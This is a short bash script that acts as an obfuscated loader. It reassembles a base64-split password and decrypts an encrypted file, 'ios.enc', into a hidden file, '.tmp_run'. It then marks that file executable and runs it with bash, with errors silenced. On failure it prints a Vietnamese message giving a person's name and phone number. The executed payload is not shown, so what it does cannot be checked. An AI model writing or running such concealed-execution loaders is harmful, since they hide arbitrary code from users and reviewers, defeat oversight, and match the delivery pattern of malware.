#!/bin/bash
A="dmlldEB4"
B="aWFvbWk="
export P_ENV=$(echo -n "$A$B" | base64 -d)
openssl enc -aes-256-cbc -d -salt -pbkdf2 -iter 100000 -in ios.enc -pass env:P_ENV -out .tmp_run 2>/dev/null
if [ $? -eq 0 ]; then
    chmod +x .tmp_run
    bash .tmp_run
else
    echo "Lỗi: Liên hệ Việt Nguyễn - 0343.22.08.93"
fi
unset P_ENV
